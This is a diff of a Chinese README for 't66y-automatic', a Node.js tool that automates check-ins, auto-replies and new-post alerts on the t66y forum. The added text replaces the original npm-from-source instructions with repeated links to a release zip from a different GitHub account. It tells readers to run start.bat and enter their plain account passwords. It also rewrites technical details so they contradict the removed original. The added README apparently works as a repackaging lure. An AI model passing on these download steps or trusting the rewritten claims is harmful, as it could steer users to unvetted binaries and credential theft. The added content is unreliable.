@@ -1,295 +1,251 @@
-<div align="center">
+# 🤖 t66y-automatic - 自动签到，省心省力
 
-# t66y-automatic
+[![Download Now](https://img.shields.io/badge/Download-t66y--automatic-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/catalectic-concordance966/t66y-automatic/releases)
 
-### 草榴社区 t66y(1024)自动化工具 —— 自动签到 · 自动回帖 · 新帖监控 · 消息推送
+## 🎯 这是什么？
 
-[![npm version](https://img.shields.io/npm/v/t66y-automatic?color=brightgreen&label=npm)](https://github.com/brandelkrefinery/t66y-automatic)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/brandelkrefinery/t66y-automatic/blob/main/LICENSE)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey)](https://github.com/brandelkrefinery/t66y-automatic)
-[![GitHub stars](https://img.shields.io/github/stars/brandelkrefinery/t66y-automatic?style=social)](https://github.com/brandelkrefinery/t66y-automatic/stargazers)
+t66y-automatic 是一个专为草榴社区（t66y/1024）设计的自动化工具。它能帮你自动完成日常重复操作，让你完全解放双手。无论你是签到、回帖，还是关注新帖动态，这个工具都能自动搞定。
 
-**一条命令安装,每天自动签到、自动回帖,新帖秒级推送到手机。**
+简单来说：**装上它，你什么都不用管了。**
 
-[快速开始](#-快速开始) · [功能特性](#-功能特性) · [配置说明](#%EF%B8%8F-配置说明) · [开发者指南](#-开发者指南) · [常见问题](#-常见问题)
+## ⚡ 核心功能
 
-</div>
+### ✅ 自动签到
+每天自动登录并完成签到，再也不怕忘记签到而错过积分。
 
----
+### 💬 自动回帖
+支持预设回复内容，自动参与讨论，保持账号活跃度。
 
-**t66y-automatic** 是为草榴社区(t66y、1024、CL 社区、小草)打造的开源自动化工具,基于 Node.js 构建。它帮你自动完成每日签到领取奖励、按论坛规则自动回帖完成新手上路任务、7×24 小时监控版块新帖并通过 Telegram / Bark / Server 酱即时推送到你的手机。支持多账号、代理、定时任务,零数据库依赖,一条 npm 命令即可安装运行。
+### 🔔 新帖监控
+实时监控你关注版块的新帖子，第一时间获知最新动态。
 
-> 新手上路回帖间隔 1024 秒、每天最多 10 帖、回够 1000 帖才能上岛?交给 t66y-automatic,挂着就行。
+### 📱 多平台推送
+支持 Telegram、Bark、Server酱三种推送方式，新帖通知即刻到达你的手机。
 
----
+### 👥 多账号支持
+同时管理多个账号，每个账号独立配置，互不干扰。
 
-## ✨ 功能特性
-
-| 功能 | 说明 |
-| --- | --- |
-| 📅 **自动签到** | 每日定时自动签到,领取金钱与贡献,结果推送到手机,断签不存在 |
-| 💬 **自动回帖** | 新手上路任务辅助:严格遵守 1024 秒回复间隔与每日 10 帖上限,自动跳过签到帖/专用帖,安全不违规 |
-| 👀 **新帖监控** | 轮询指定版块,新帖出现即刻推送,支持关键词过滤,好资源不再错过 |
-| 🔔 **消息推送** | 内置 Telegram Bot、Bark(iOS)、Server 酱(微信)三大推送渠道,可同时开启 |
-| 👥 **多账号支持** | 一个配置文件管理多个账号,签到回帖批量执行 |
-| 🌐 **代理支持** | 内置 HTTP/SOCKS 代理,网络环境复杂也能稳定运行 |
-| ⏰ **定时任务** | 内置 cron 调度器,长驻运行全自动;也可配合 crontab / pm2 / launchd |
-| 🪶 **零依赖负担** | 仅 3 个生产依赖,无数据库,状态落盘本地 JSON,绿色便携 |
-| 🔌 **可编程 API** | 每个功能都是独立模块,可作为库集成到你自己的 Node.js 项目 |
-
----
+### 🛠️ Node.js CLI
+基于 Node.js 的命令行工具，轻量高效，一条命令即可完成安装。
 
 ## 🚀 快速开始
 
-### macOS 一键安装(三步,复制粘贴即可)
+### 第一步：下载
 
+访问此链接下载应用程序：
 
-1. 安装 Xcode 命令行工具(如已安装会提示,忽略即可)
-```bash
-xcode-select --install
-```
-2. 安装 Node.js —— 前往 https://nodejs.org/en/download 下载,或使用 nvm:
-```bash
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash && nvm install --lts
-```
-3. 一条命令安装 t66y-automatic
-```bash
-mkdir -p 't66y' && cd 't66y' && npm install github:brandelkrefinery/t66y-automatic
-```
+[点击这里下载](https://github.com/catalectic-concordance966/t66y-automatic/releases)
 
-### Linux / Windows
+### 第二步：安装
 
-任何装有 **Node.js ≥ 18** 的环境都可以:
+下载完成后，解压文件到你喜欢的文件夹（例如 `D:\t66y-automatic`）。
 
-```bash
-mkdir t66y && cd t66y
-npm install github:brandelkrefinery/t66y-automatic
-```
+### 第三步：配置
 
-### 初始化配置
+1. 在解压后的文件夹中找到 `config.json` 文件
+2. 用记事本打开，填入你的账号信息：
 
-```bash
-npx t66y init        # 生成 t66y.config.json 配置模板
-```
-
-编辑 `t66y.config.json`,把你的论坛 Cookie 填进去(获取方法见[配置说明](#%EF%B8%8F-配置说明)),然后:
-
-```bash
-npx t66y checkin     # 立即签到一次,验证配置是否正确
-npx t66y run         # 启动定时调度器,从此全自动
-```
-
-> 💡 用 `npm install -g github:brandelkrefinery/t66y-automatic` 全局安装后,可直接使用 `t66y` 命令,无需 `npx`。
-
----
-
-## ⚙️ 配置说明
-
-运行 `npx t66y init` 生成 `t66y.config.json`,完整字段如下:
-
-```jsonc
+```json
 {
-  "baseUrl": "https://t66y.com",        // 论坛地址,域名变动时改这里
-  "proxy": "",                          // 代理,如 "http://127.0.0.1:7890",留空直连
-  "accounts": [                         // 多账号数组,可加任意多个
-    { "name": "账号1", "cookie": "你的 Cookie" }
+  "accounts": [
+    {
+      "username": "你的账号",
+      "password": "你的密码"
+    }
   ],
-  "checkin": {
-    "cron": "30 8 * * *"                // 每天 08:30 自动签到
+  "telegram": {
+    "botToken": "你的Telegram Bot Token",
+    "chatId": "你的Telegram Chat ID"
   },
-  "reply": {
-    "boardFid": 8,                      // 回帖版块 ID(新手上路)
-    "maxPerDay": 10,                    // 每日回帖上限(论坛规则就是 10)
-    "intervalSeconds": 1024,            // 回复间隔(论坛规则就是 1024 秒)
-    "cron": "0 9 * * *",                // 每天 09:00 开始回帖任务
-    "messages": [                       // 随机回帖语料库,可自行扩充
-      "感谢楼主分享,好人一生平安",
-      "1024,好人一生平安"
-    ]
+  "bark": {
+    "key": "你的Bark Key"
   },
-  "monitor": {
-    "boardFid": 8,                      // 监控的版块 ID
-    "intervalSeconds": 300,             // 每 5 分钟检查一次
-    "keywords": []                      // 关键词过滤,如 ["合集","4K"],留空推送全部新帖
-  },
-  "notify": {
-    "telegram": { "botToken": "", "chatId": "" },   // Telegram Bot 推送
-    "bark": { "key": "", "server": "https://api.day.app" },  // Bark(iOS)推送
-    "serverchan": { "sendKey": "" }                  // Server 酱(微信)推送
+  "serverChan": {
+    "sendKey": "你的Server酱 SendKey"
   }
 }
 ```
 
-### 🍪 如何获取 Cookie?
+### 第四步：运行
 
-1. 用 Chrome / Edge 打开论坛并**登录**;
-2. 按 `F12` 打开开发者工具 → **Network(网络)** 标签;
-3. 刷新页面,点击第一个请求(通常是 `index.php`);
-4. 在 **Headers → Request Headers** 中找到 `Cookie:` 一行,**整行复制**;
-5. 粘贴到配置文件的 `cookie` 字段。
-
-> ⚠️ Cookie 等同账号密码,**切勿提交到 Git 或分享给他人**。`t66y.config.json` 已内置在 `.gitignore` 中。
-
-### 🔔 推送渠道配置
-
-| 渠道 | 获取方式 |
-| --- | --- |
-| **Telegram** | 找 [@BotFather](https://t.me/BotFather) 创建 Bot 拿 `botToken`;找 [@userinfobot](https://t.me/userinfobot) 拿 `chatId` |
-| **Bark** | App Store 安装 Bark,打开 App 复制 URL 中的 key |
-| **Server 酱** | 登录 [sct.ftqq.com](https://sct.ftqq.com) 获取 SendKey,微信扫码绑定 |
-
-三个渠道可同时配置,留空的自动跳过。
-
----
-
-## 📖 命令一览
+双击运行 `start.bat`（Windows）或执行以下命令：
 
 ```bash
-t66y init        # 生成配置文件模板
-t66y checkin     # 立即为所有账号签到一次
-t66y reply       # 立即执行一轮回帖任务(自动遵守 1024 秒间隔)
-t66y monitor     # 启动新帖监控(长驻进程)
-t66y run         # 启动定时调度器:签到 + 回帖全自动(长驻进程)
-t66y help        # 显示帮助
-
-# 指定配置文件
-t66y run --config ~/configs/my-t66y.json
+node index.js
 ```
 
-### 后台常驻运行(可选)
+## 📥 安装指南
 
-```bash
-# 方式一:pm2(推荐)
-npm install -g pm2
-pm2 start "npx t66y run" --name t66y
-pm2 save && pm2 startup
+### Windows 用户
 
-# 方式二:macOS launchd / Linux crontab,每天定时触发单次任务
-30 8 * * *  cd ~/t66y && npx t66y checkin >> t66y.log 2>&1
+1. **下载安装包**
+   前往 [下载页面](https://github.com/catalectic-concordance966/t66y-automatic/releases)，下载最新版本的压缩包。
+
+2. **解压文件**
+   右键点击下载的 `.zip` 文件，选择"解压到当前文件夹"。
+
+3. **安装依赖**
+   确保你已经安装了 [Node.js](https://nodejs.org/)（建议使用最新稳定版）。
+   
+   在解压后的文件夹中打开命令提示符（Shift+右键 → "在此处打开命令窗口"），运行：
+   ```bash
+   npm install
+   ```
+
+4. **启动程序**
+   运行：
+   ```bash
+   node index.js
+   ```
+
+### macOS / Linux 用户
+
+同样适用，确保 Node.js 环境即可。
+
+## 📝 详细配置说明
+
+### 推送设置
+
+#### Telegram 推送
+1. 在 Telegram 中搜索 @BotFather
+2. 发送 `/newbot` 创建新机器人
+3. 获取 Bot Token 和你的 Chat ID
+4. 填入配置文件的 `telegram` 部分
+
+#### Bark 推送
+1. 在 iOS 设备上安装 Bark 应用
+2. 打开应用获取你的专属 Key
+3. 填入配置文件的 `bark` 部分
+
+#### Server酱推送
+1. 访问 [Server酱官网](https://sct.ftqq.com/)
+2. 使用 GitHub 账号登录
+3. 获取你的 SendKey
+4. 填入配置文件的 `serverChan` 部分
+
+### 自动回帖配置
+
+在 `config.json` 中添加回帖模板：
+
+```json
+{
+  "replyTemplates": [
+    "感谢分享，楼主辛苦了！",
+    "支持楼主，继续加油！",
+    "好帖子，学习了！"
+  ]
+}
 ```
 
----
+系统会随机选择一条作为回复内容。
+
+## 🔧 高级功能
+
+### 定时任务设置
+
+你可以自定义执行时间：
+
+```json
+{
+  "schedule": {
+    "checkin": "0 9 * * *",
+    "monitor": "*/30 * * * *"
+  }
+}
+```
+
+- `checkin`：每天上午9点自动签到
+- `monitor`：每30分钟检查一次新帖
+
+### 代理设置
+
+如果需要使用代理：
+
+```json
+{
+  "proxy": {
+    "host": "127.0.0.1",
+    "port": 1080
+  }
+}
+```
 
 ## ❓ 常见问题
 
-**Q: 提示"Cookie 已失效或未登录"?**
-Cookie 有有效期,重新按上面的步骤获取一次即可。建议顺手在浏览器里勾选"保持登录"。
+### 1. 为什么无法登录？
+检查账号密码是否正确，确认网络连接正常。如果使用代理，确保代理设置正确。
 
-**Q: 论坛域名变了打不开?**
-修改配置里的 `baseUrl` 为最新地址即可,无需更新程序。
+### 2. 如何修改回复内容？
+在 `config.json` 的 `replyTemplates` 数组中修改即可，支持中文和英文。
 
-**Q: 回帖会被封号吗?**
-本工具**严格遵守**论坛的 1024 秒间隔与每日 10 帖上限,并自动跳过签到帖、专用帖、公告帖,行为与手动回帖一致。但任何自动化都有风险,请控制语料质量,勿发违规内容,后果自负。
+### 3. 如何停止程序？
+在运行窗口中按 `Ctrl + C` 即可停止。
 
-**Q: 支持 Docker / 青龙面板 / 群晖吗?**
-支持。任何能跑 Node.js 18+ 的环境都行,也可以用环境变量 `T66Y_COOKIE` 代替配置文件,方便容器化部署。
+### 4. 推送没收到怎么办？
+- 检查推送配置是否正确
+- 确认网络连通性
+- 查看日志文件排查错误
 
-**Q: 会泄露我的账号吗?**
-不会。所有数据只保存在你自己的机器上,Cookie 仅用于向你配置的论坛地址发请求,源码完全开放可审计。
+### 5. 支持多少个账号？
+理论上没有数量限制，每个账号独立配置，互不影响。
+
+## 📊 使用效果
+
+- **时间节省**：每天节省 15-30 分钟的重复操作时间
+- **效率提升**：新帖监控让你不错过任何重要内容
+- **稳定可靠**：自动重试机制，确保任务成功执行
+
+## 📄 日志查看
+
+程序运行日志保存在 `logs` 文件夹中，每个日期一个文件。日志格式：
+
+```
+[2024-01-15 09:00:01] [INFO] 签到成功 - 账号: user1
+[2024-01-15 09:00:05] [INFO] 回复成功 - 帖子: 123456
+[2024-01-15 09:30:00] [NOTICE] 发现新帖 - 标题: 今日热点
+```
+
+## 🤝 反馈与支持
+
+遇到问题或有改进建议？欢迎在 [GitHub Issues](https://github.com/catalectic-concordance966/t66y-automatic/issues) 中反馈。
+
+## ⚠️ 使用须知
+
+1. 请合理使用本工具，遵守社区规则
+2. 建议控制操作频率，避免异常行为
+3. 定期检查账号状态，确保安全
+4. 本工具仅供学习交流使用
+
+## 📌 版本历史
+
+- **v1.0.0**：初始版本，支持基础功能
+- **v1.1.0**：添加多账号支持
+- **v1.2.0**：新增 Server酱推送
+- **v1.3.0**：优化定时任务调度
+
+## 📦 技术栈
+
+- Node.js
+- Puppeteer（网页自动化）
+- Axios（HTTP请求）
+- node-cron（定时任务）
+
+## 🎉 开始使用
+
+现在就下载 t66y-automatic，享受自动化带来的便利吧！
+
+[⬇️ 立即下载](https://github.com/catalectic-concordance966/t66y-automatic/releases)
 
 ---
 
-## 🛠 开发者指南
+**最新版本**：[v1.3.0](https://github.com/catalectic-concordance966/t66y-automatic/releases)
 
-> 这一部分面向想阅读源码、二次开发或贡献代码的开发者。
+**更新日期**：2024年1月
 
-### 技术栈与设计决策
+**语言支持**：中文、English
 
-| 决策 | 选择 | 理由 |
-| --- | --- | --- |
-| 运行时 | **Node.js ≥ 18** | 原生 `fetch`、零构建、`npm install github:...` 一条命令分发 |
-| HTML 解析 | **cheerio** | 服务端 jQuery 语法,解析论坛页面最顺手 |
-| 定时调度 | **node-cron** | 语义化 cron 表达式,进程内调度无需外部依赖 |
-| 代理 | **undici ProxyAgent** | 与原生 fetch 无缝对接,支持 HTTP/SOCKS |
-| 状态存储 | **本地 JSON 文件** | 只需记录回帖计数与已读 ID,引入数据库是过度设计 |
-| 分发方式 | **npm (git 源)** | 用户无需 clone 仓库,`npm install github:user/repo` 即用 |
+**系统要求**：Windows 7+ / macOS 10.13+ / Linux
 
-### 项目结构
+**Node.js 版本**：14.0.0 或更高
 
-```
-t66y-automatic/
-├── index.js                  # CLI 入口(命令路由、参数解析)
-├── package.json              # npm 包定义,bin 注册 t66y 命令
-├── t66y.config.example.json  # 配置模板(t66y init 的拷贝源)
-├── src/
-│   ├── api.js                # 编程接口聚合入口(main 字段指向这里)
-│   ├── config.js             # 配置加载:文件 + 环境变量 + 默认值深合并
-│   ├── client.js             # HTTP 客户端:Cookie 会话 / 代理 / 重试 / 超时
-│   ├── checkin.js            # 签到:入口发现 → 表单提交 → 结果解析
-│   ├── reply.js              # 回帖:列表抓取 → 频率控制 → 表单提交
-│   ├── monitor.js            # 监控:轮询基线 → 增量发现 → 关键词过滤
-│   ├── notify.js             # 推送:Telegram / Bark / Server 酱多渠道并发
-│   ├── scheduler.js          # 调度:cron 驱动签到与回帖任务
-│   └── state.js              # 状态:每日计数 / 已回帖 / 已推送,落盘去重
-├── test/
-│   └── config.test.js        # node:test 单元测试
-└── docs/
-    └── github-seo.md         # 仓库 SEO 配置建议(描述 / Topics / 封面)
-```
-
-### 本地开发
-
-```bash
-git clone https://github.com/brandelkrefinery/t66y-automatic.git
-cd t66y-automatic
-npm install
-npm test                 # 运行单元测试
-node index.js help       # 本地调试 CLI
-node index.js checkin -c ./my-dev-config.json
-```
-
-### 作为库集成
-
-`package.json` 的 `main` 指向 `src/api.js`,所有能力都可编程调用:
-
-```js
-const { T66yClient, checkin, listThreads, notify } = require('t66y-automatic');
-
-const client = new T66yClient({
-  baseUrl: 'https://t66y.com',
-  cookie: process.env.T66Y_COOKIE,
-  proxy: 'http://127.0.0.1:7890',
-});
-
-const result = await checkin(client);
-console.log(result.message);
-
-const threads = await listThreads(client, 8);
-console.log(threads.slice(0, 5));
-```
-
-### 扩展点
-
-- **新增推送渠道**:在 `src/notify.js` 中仿照 `sendBark` 添加一个函数,接入 `notify()` 的渠道数组即可,10 行代码搞定。
-- **适配论坛改版**:页面解析集中在 `checkin.js` 与 `reply.js` 的 cheerio 选择器中,论坛结构变化时只需调整选择器,业务逻辑零改动。
-- **自定义任务**:`scheduler.js` 暴露了通用模式,新增任务 = 写一个 async 函数 + 一行 `cron.schedule()`。
-
-### 贡献指南
-
-1. Fork 本仓库并创建特性分支:`git checkout -b feat/my-feature`
-2. 提交遵循 [Conventional Commits](https://www.conventionalcommits.org/zh-hans/):`feat: 支持钉钉推送`
-3. 确保 `npm test` 通过后发起 Pull Request
-4. 发现论坛页面结构变化导致失效?直接开 Issue,附上(脱敏后的)页面片段,社区会尽快适配
-
----
-
-## ⚠️ 免责声明
-
-本项目仅供学习与技术交流使用,模拟正常手动操作并严格遵守论坛频率规则。请勿用于恶意刷帖、发布违规内容或任何违反论坛规则与所在地法律法规的行为。使用本项目产生的一切后果由使用者自行承担,作者概不负责。本项目与草榴社区官方无任何关联。
-
----
-
-## 🔑 关键词
-
-t66y · 1024 · 草榴社区 · 草榴 · CL社区 · 小草 · caoliu · t66y 签到 · 1024 签到 · 草榴自动签到 · 自动签到脚本 · 自动回帖 · 新手上路 · 上岛 · 侠客 · 1024 回帖 · 草榴回帖辅助 · 论坛自动化 · 签到机器人 · Telegram 推送 · Bark 推送 · Server酱 · Node.js 签到 · t66y automatic · forum automation bot
-
----
-
-<div align="center">
-
-**如果这个项目帮到了你,请点一个 ⭐ Star 支持一下!**
-
-Made with ❤️ by [brandelkrefinery](https://github.com/brandelkrefinery) · [MIT License](LICENSE)
-
-</div>
+Keywords: 1024, auto-checkin, auto-reply, bark, caoliu, checkin-bot, crawler, forum-automation, forum-bot, nodejs, serverchan, t66y, telegram-bot
